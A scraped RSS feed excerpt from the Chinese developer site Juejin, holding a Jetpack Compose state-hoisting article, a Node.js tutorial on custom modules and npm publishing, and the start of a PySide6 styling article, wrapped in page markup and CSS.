<p>这个示例展示了从模型定义到API集成的全流程。<strong>运行后可通过POST请求添加用户，GET请求查询文章</strong>，适合作为进阶起点扩展。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Compose 提升状态的场景]]></title>    <link>https://juejin.cn/post/7581412054903242761</link>    <guid>https://juejin.cn/post/7581412054903242761</guid>    <pubDate>2025-12-09T04:08:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412054903242761" data-draft-id="7581619505584357427" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose 提升状态的场景"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-09T04:08:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Best_Jerry"/> <meta itemprop="url" content="https://juejin.cn/user/1099167360106999"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose 提升状态的场景
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099167360106999/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Best_Jerry
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:08:35.000Z" title="Tue Dec 09 2025 04:08:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DhWwZ_AuSGfo" target="_blank" title="https://www.youtube.com/watch?v=hWwZ_AuSGfo" ref="nofollow noopener noreferrer">Where to hoist that state in Compose?</a>
了解在 Jetpack Compose 中提升状态的方式和场景。</p>
<h2 data-id="heading-0">1. Composable functions</h2>
<p>点击 Message 展示消息时间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aa18c47d70347efa451f2bf213a8bca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=39q65%2FocCVlPYJ6ebuuJ%2BVxBeTA%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87a7e5044b254d06b4620e200782e1a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=XwO6HQ9PBpBxyFLj6rmqcIIxuew%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">Not hoisting is a valid option.</h3>
<p>这个 UI 逻辑例子不需要提升状态。</p>
<h2 data-id="heading-2">2. State hoisting</h2>
<p>在下面的例子中，消息列表的状态需要提升。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09febab1d1054ad98ea3af6954ea0db2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=ifvc%2FpgVqAjVz1R97JP%2FrVMfUbw%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab1fd642468e4bfba445b4bf6fc48ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=KpmIED66oQI3RklqGc9G%2BRvZ9z4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d66ca43a293e4914a93cc0ea5b018fe8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=i%2BWhx6VDxPZn0nqW1hTj1G6He6U%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97d0195e029149e6bc023a7953c698d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=TyvNtxMpEssqPtuzBGYXWLtLpQE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f93e970635545dd9803889c7916d6ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=vSUshFKx%2FR%2FfKiu1VSEwSgjaFB0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52cdc9a7deca4bf48b87e6520469ca47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=UDDXMsvlBlC1VFEAm3MMtCSE86E%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">Place state in the lowest common ancestor.</h3>
<h2 data-id="heading-4">3. Plain state holder class</h2>
<p>使用 state holder class 做状态提升，例如 LazyListState。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96b782f8acc34a31bde8a06c7c950d84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=QzxOR0hJA%2BjJovN6wfKqr3rNUmo%3D" alt="image.png" loading="lazy"/></p>
<p>LazyListState 抽象了 scrollPosition 同时暴露了应用逻辑的方法，比如 scrollToItem()、scroll()、animateScrollToItem()。</p>
<h2 data-id="heading-5">4. Android architecture Components（AAC）ViewModel</h2>
<p>使用 ViewModel 做状态提升。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4948223ccdc475aa2cd7d747191bfe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=52Vm7QD2O1hrUFQ%2FVFIA%2FNvkf6w%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94e671802e764757b6c000793cc89d90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=U44a5ZmvTcRWlM16WO8a53mZ4Rc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3035f0fa00ed44019183000d596d4a70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=7t%2ByBzB6ojKxY0gnVVWkhcMnpMc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">5. Recap</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c783a099ed54d1f81d56ad4d1556392~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=NO4pwuuyEmet%2FcedyPQSFkUrGqI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db75c5f2d3445e49ae1a772bd8db3b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=VbuYRdWmW62bIeR0SvlQ0PfF5i0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">Keep state as low as possible.</h3></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：自定义模块与包发布全流程解析]]></title>    <link>https://juejin.cn/post/7581412054902980617</link>    <guid>https://juejin.cn/post/7581412054902980617</guid>    <pubDate>2025-12-09T03:40:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412054902980617" data-draft-id="7581412054902423561" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：自定义模块与包发布全流程解析"/> <meta itemprop="keywords" content="后端,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-09T03:40:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：自定义模块与包发布全流程解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:40:31.000Z" title="Tue Dec 09 2025 03:40:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在使用 Node.js 开发应用时，将代码拆分成可复用的模块是一项基本能力。但真正的工程化实践，不止是“写模块”这么简单，还包括如何规范结构、如何发布到 npm、如何让别人能够顺畅地安装和使用。在本文中，我们将从最基础的自定义模块开始，逐步深入到完整的 npm 包发布流程，帮助你掌握一条完整的从本地代码到线上开源的路径。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、自定义模块的基本形式</h2>
<p>Node.js 默认支持 CommonJS 模块规范，因此创建模块非常简单。只需要创建一个 <code>.js</code> 文件，通过 <code>module.exports</code> 或 <code>exports</code> 暴露功能即可。</p>
<h3 data-id="heading-1">1. 定义模块</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// math.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  add
};
</code></pre>
<h3 data-id="heading-2">2. 引入模块</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)); <span class="hljs-comment">// 3</span>
</code></pre>
<p>通过这种方式，你就能将功能拆分到不同文件，保持代码清晰可维护。</p>
<hr/>
<h2 data-id="heading-3">二、模块组织结构设计</h2>
<p>随着项目增大，模块会不断增加，因此你需要为模块设计结构，让使用者能够一眼理解逻辑。</p>
<p>常见结构如下：</p>
<pre><code class="hljs language-lua" lang="lua">my-lib/
 ├── src/
 │    ├── index.js
 │    ├── <span class="hljs-built_in">math</span>.js
 │    └── tools.js
 ├── <span class="hljs-built_in">package</span>.json
 ├── README.md
 └── LICENSE
</code></pre>
<p><code>index.js</code> 通常作为主入口，将内部模块进行统一导出：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);
<span class="hljs-keyword">const</span> tools = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./tools'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  ...math,
  ...tools
};
</code></pre>
<p>这样使用者就只需要引入一处入口即可。</p>
<hr/>
<h2 data-id="heading-4">三、初始化 npm 包</h2>
<p>要将模块变成可安装的 npm 包，需要先创建 <code>package.json</code>。</p>
<p>在项目根目录执行：</p>
<pre><code class="hljs language-bash" lang="bash">npm init -y
</code></pre>
<p>它会自动生成一个最基础的 <code>package.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-lib"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"main"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"src/index.js"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"license"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"MIT"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>你可以根据需要补充描述、关键字、作者信息等。</p>
<hr/>
<h2 data-id="heading-5">四、发布前的重要准备</h2>
<p>在发布包之前，你需要确认以下内容已经完备：</p>
<h3 data-id="heading-6">1. README 文档清晰</h3>
<p>包含使用方法、API、示例等，让用户了解你的包能做什么。</p>
<h3 data-id="heading-7">2. LICENSE 许可协议</h3>
<p>开源必须明确授权，否则用户无法确定使用边界。</p>
<h3 data-id="heading-8">3. <code>.npmignore</code> 文件</h3>
<p>用于排除无需发布的文件，例如测试、文档、临时文件等。</p>
<p>例子：</p>
<pre><code class="hljs language-bash" lang="bash">node_modules/
<span class="hljs-built_in">test</span>/
docs/
*.<span class="hljs-built_in">log</span>
</code></pre>
<p>如果没有 <code>.npmignore</code>，npm 会参考 <code>.gitignore</code>。</p>
<hr/>
<h2 data-id="heading-9">五、发布 npm 包的完整流程</h2>
<h3 data-id="heading-10">1. 登录 npm 账号</h3>
<p>确保你已经在 npm 官网注册账户，然后在终端执行：</p>
<pre><code class="hljs language-bash" lang="bash">npm login
</code></pre>
<p>输入用户名、密码、邮箱后即可登录。</p>
<h3 data-id="heading-11">2. 版本号递增</h3>
<p>npm 强制要求每次发布都必须提升版本号：</p>
<pre><code class="hljs language-bash" lang="bash">npm version patch
</code></pre>
<p>常见语义化版本规则：</p>
<ul>
<li><code>patch</code>：修复 Bug</li>
<li><code>minor</code>：新增功能但不破坏兼容性</li>
<li><code>major</code>：破坏性更新</li>
</ul>
<h3 data-id="heading-12">3. 正式发布</h3>
<pre><code class="hljs language-bash" lang="bash">npm publish
</code></pre>
<p>如果你的是作用域包并默认私有，需要加上：</p>
<pre><code class="hljs language-bash" lang="bash">npm publish --access public
</code></pre>
<p>发布成功后，你的包就可以被任何开发者通过以下方式安装：</p>
<pre><code class="hljs language-bash" lang="bash">npm install my-lib
</code></pre>
<hr/>
<h2 data-id="heading-13">六、更新与维护包</h2>
<p>发布之后的维护同样重要，你可以：</p>
<ul>
<li>修复问题后再次发布新版本</li>
<li>添加更多 API</li>
<li>优化文档</li>
<li>使用 GitHub Issues 跟踪反馈</li>
</ul>
<p>包是长期发展的，良好的维护能让它更受欢迎。</p>
<hr/>
<h2 data-id="heading-14">七、总结</h2>
<p>自定义模块是 Node.js 中最基础也最关键的部分，而包发布则是 Node.js 生态中最具工程价值的能力。通过掌握从模块拆分、结构设计，到 npm 发布的完整流程，你能够让自己的代码真正进入生态、被更多开发者使用，这也是开源精神的重要体现。</p>
<p>如果你正在构建项目，建议从一个简单的工具包开始练习，把你的常用函数、工具类封装出来，再尝试发布到 npm，这将是一次非常有价值的学习过程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在PySide6/PyQt6的项目中实现样式切换处理]]></title>    <link>https://juejin.cn/post/7581478953866575872</link>    <guid>https://juejin.cn/post/7581478953866575872</guid>    <pubDate>2025-12-09T04:19:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581478953866575872" data-draft-id="7581437632854294568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在PySide6/PyQt6的项目中实现样式切换处理"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T04:19:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="伍华聪"/> <meta itemprop="url" content="https://juejin.cn/user/122769398839592"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 